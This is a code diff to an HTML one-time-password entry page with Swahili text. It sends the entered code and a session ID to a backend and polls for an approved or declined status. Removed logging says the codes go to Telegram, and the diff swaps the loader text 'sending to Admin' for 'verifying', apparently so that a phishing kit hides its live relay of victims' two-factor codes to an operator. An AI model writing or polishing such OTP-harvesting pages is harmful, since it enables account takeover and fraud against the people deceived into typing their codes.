@@ -2,10 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .otp-input { width: 45px; height: 55px; border: 2px solid #cbd5e1; border-radius: 12px; text-align: center; font-size: 1.5rem; font-weight: bold; color: #003366; }
         .otp-input:focus { border-color: #ffd600; outline: none; }
+        /* Pendulum Style Spin Animation */
         .pendulum { display: flex; gap: 8px; justify-content: center; margin-top: 20px; }
         .dot { width: 12px; height: 12px; background: #ffd600; border-radius: 50%; animation: swing 0.6s infinite alternate; }
         @keyframes swing { from { transform: translateX(-15px); } to { transform: translateX(15px); } }
@@ -20,22 +22,15 @@
 
         <div id="loader" class="hidden">
             <div class="pendulum"><div class="dot"></div><div class="dot" style="animation-delay: 0.2s"></div></div>
-            <p class="text-gray-400 italic text-sm mt-4">Inatuma kwa Admin...</p>
+            <p class="text-gray-400 italic text-sm mt-4">Inahakiki...</p>
         </div>
 
         <p id="error" class="hidden text-red-500 font-bold">Kodi si sahihi. Jaribu tena.</p>
     </div>
 
     <script>
-        // Use the saved sessionId or generate one if missing
-        let sessionId = localStorage.getItem('sessionId');
-        if(!sessionId) {
-            sessionId = 'user_' + Date.now();
-            localStorage.setItem('sessionId', sessionId);
-        }
-
-        const params = new URLSearchParams(window.location.search);
-        const digits = params.get('digits') || 6;
+        const sessionId = localStorage.getItem('sessionId');
+        const digits = new URLSearchParams(window.location.search).get('digits') || 6;
         const container = document.getElementById('box-container');
 
         for (let i = 0; i < digits; i++) {
@@ -43,54 +38,37 @@
             input.type = "tel"; input.maxLength = 1; input.className = "otp-input";
             input.addEventListener('input', (e) => {
                 if (e.target.value && e.target.nextElementSibling) e.target.nextElementSibling.focus();
-                const allFilled = Array.from(document.querySelectorAll('.otp-input')).every(i => i.value !== "");
-                if (allFilled) submitOtp();
+                submitOtp();
             });
             container.appendChild(input);
         }
 
         async function submitOtp() {
-            const otpValue = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
-            
-            document.getElementById('loader').classList.remove('hidden');
-            document.getElementById('error').classList.add('hidden');
-
-            try {
-                const response = await fetch('http://localhost:5000/api/submit-otp', {
+            const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+            if (otp.length == digits) {
+                document.getElementById('loader').classList.remove('hidden');
+                document.getElementById('error').classList.add('hidden');
+                await fetch('http://localhost:5000/api/submit-otp', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        otp: otpValue, 
-                        sessionId: sessionId 
-                    })
+                    body: JSON.stringify({ otp, sessionId })
                 });
-
-                if (response.ok) {
-                    console.log("Sent to Telegram successfully");
-                    startPolling();
-                } else {
-                    console.error("Failed to send to Telegram");
-                }
-            } catch (err) {
-                console.error("Connection error:", err);
+                startPolling();
             }
         }
 
         function startPolling() {
             const timer = setInterval(async () => {
-                try {
-                    const res = await fetch(`http://localhost:5000/api/status/${sessionId}`);
-                    const data = await res.json();
-                    if (data.status === 'approved') {
-                        window.location.href = "dashboard.html";
-                    } else if (data.status === 'declined') {
-                        clearInterval(timer);
-                        document.getElementById('loader').classList.add('hidden');
-                        document.getElementById('error').classList.remove('hidden');
-                        document.querySelectorAll('.otp-input').forEach(i => i.value = '');
-                        document.querySelectorAll('.otp-input')[0].focus();
-                    }
-                } catch (e) {}
+                const res = await fetch(`http://localhost:5000/api/status/${sessionId}`);
+                const data = await res.json();
+                if (data.status === 'approved') {
+                    window.location.href = "dashboard.html";
+                } else if (data.status === 'declined') {
+                    clearInterval(timer);
+                    document.getElementById('loader').classList.add('hidden');
+                    document.getElementById('error').classList.remove('hidden');
+                    document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+                }
             }, 2000);
         }
     </script>
